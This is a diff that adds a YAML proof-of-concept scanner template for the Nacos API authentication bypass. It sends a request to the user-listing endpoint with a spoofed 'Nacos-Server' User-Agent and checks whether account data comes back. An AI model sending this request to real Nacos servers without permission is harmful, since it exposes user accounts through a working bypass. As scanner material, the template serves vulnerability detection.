@@ -1,0 +1,19 @@
+id: poc-yaml-nacos-api-auth-bypass
+info:
+  name: Nacos API 认证绕过漏洞
+  severity: high
+  tags:
+  - 认证绕过
+  finger: Nacos
+  osprey-id: vb_2021_0003
+requests:
+- method: GET
+  path: /nacos/v1/auth/users?pageNo=1&pageSize=9
+  headers:
+    User-Agent: Nacos-Server
+  expression: 'contains(body, "pageItems") && contains(body, "pagesAvailable") &&
+    contains(body, "username")
+
+    '
+variables: {}
+transport: http
